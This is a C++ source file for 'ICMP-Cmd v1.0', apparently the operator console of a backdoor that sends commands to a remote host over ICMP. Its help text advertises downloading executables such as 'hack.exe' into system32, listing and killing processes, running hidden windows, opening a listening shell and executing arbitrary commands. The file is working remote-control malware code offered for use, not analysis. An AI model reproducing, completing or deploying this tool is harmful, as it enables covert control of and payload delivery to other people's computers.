#pragma once
#include <winsock2.h>
#include "../def.h"
#include "psfile.h"
char SendMsg[MAX_PACKET];

//void fill_icmp_data(char *, int, int);
//USHORT checksum(USHORT *, int);
//void decode_resp(char *,int ,struct sockaddr_in *);//ICMP????
void help(void);
void usage(char * prog);
//void PsFileListSend(int type,int,int);//0: number, 1: content, 2:from, 3:to
//char* PsFileGetMD5(const char*);

ICMP_CONTROL svr;
int main(int argc, char *argv[])
{
	if(argc!=2)
	{
		usage(argv[0]);
		return 0;
	}

	/*PsFile*/remoteIP=argv[1];
	svr.socket(argv[1]);

	svr.SetTimeOut(0,4000);
	recvtimeout=4000+stdrecvtimeout;
	svr.SetTimeOut(1,recvtimeout);

	usage(argv[0]);
	__try{
		for(;;){
			printf("ICMP-CMD>");
			fgets(SendMsg,sizeof(SendMsg)-1,stdin);//?????,???SendMsg???
			if(!strcmp(SendMsg,"Q\n")||!strcmp(SendMsg,"q\n"))ExitProcess(0);
			if(!strcmp(SendMsg,"\n"))continue;
			if(!strcmp(SendMsg,"H\n")||!strcmp(SendMsg,"h\n")){help();continue;}
			if(!memcmp(SendMsg,"http://",7))
				if(!strstr(SendMsg,"-")){
					printf("\nFileName Error. Use ");
					continue;
				}
			if(!memcmp(SendMsg,"[TimeOut]",9) || !memcmp(SendMsg,"[timeout]",9) || !memcmp(SendMsg,"[TIMEOUT]",9))
			{
				char *NewSendMsg=((char*)&SendMsg+sizeof("[TimeOut]"));
				if(*NewSendMsg=='\0')
				{
					printf("Timeout: %d\n",recvtimeout-stdrecvtimeout);
					continue;
				}
				int lto=atoi(NewSendMsg);
				if(lto<500)
				{
					printf("The number '%d' is less than 500 !\n",lto);
					continue;
				}
				recvtimeout=lto+stdrecvtimeout;
				svr.SetTimeOut(1,recvtimeout);
				continue;
			}
			if(!strcmp(SendMsg,"[psfile]\n") || !strcmp(SendMsg,"[psfile]\n"))
			{
				system("cls");
				GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE),&csbi);
				if(csbi.srWindow.Bottom<5 || csbi.srWindow.Right<20)continue;
				memset(outscreen,0,sizeof(outscreen));
				for(int i=0;i<csbi.srWindow.Right-1;i++)outscreen[0][i]=outscreen[csbi.srWindow.Bottom-1-1-1][i]='-';
				for(i=0;i<csbi.srWindow.Bottom-1-1;i++)outscreen[i][0]=outscreen[i][csbi.srWindow.Right-1-1]='|';
				//RefreshToDo("Getting drivers ...... ");ScreenOut();
				hOutput=GetStdHandle(STD_OUTPUT_HANDLE);
				DWORD filePID,dwEC;
				HANDLE fileThread=CreateThread(NULL,0,FileCommand,NULL,0,&filePID);
				WaitForSingleObject(fileThread,INFINITE);

				RefreshToDo("Press any key to return ...                   \n");getch();
				CloseHandle(fileThread);continue;
			}
				
			if(!svr.send(SendMsg))continue;
			if(!svr.recv())
				continue;

				
		}//end for
	}//end try


	__finally
	{
		
	}
	return 0;
}

void  usage(char *prog)
{
	printf("\t\t=====-------------------------------======\n");
	printf("\n");
	printf("\t\t---[ ICMP-Cmd v1.0 beta, edit by mh   ]---\n");
	printf("\t\t---[ E-mail: -------------------      ]---\n");
	printf("\t\t---[                        ----/--/- ]---\n");
	printf("\n");
	printf("\t\tusage: %s RemoteIP\n",prog);
	printf("\t\tCtrl+C or Q/q to Quit        H/h for help\n");
}


void decode_resp(char *buf, int bytes,struct sockaddr_in *from) 
{

}
void help(void)
{
	printf("\n");
	printf("[http://127.0.0.1/hack.exe -admin.exe]  (Download Files. Parth is ////system32)\n");
	printf("[pslist]           (List the Process)\n");
	printf("[pskill ID]        (Kill the Process)\n");
	printf("[timeout] (number) (Recv (or execute)'s Time\n");
	printf("[showwindow] 0(default) or 1 (Run the process with(out) GUI).\n");
	printf("[activeshell] (port to listen)");
	printf("[setcmd] ([default] | (Path))     (Reset the path of cmd.)\n");
	printf("Command            (run the command)\n"); 
	printf("\n");

}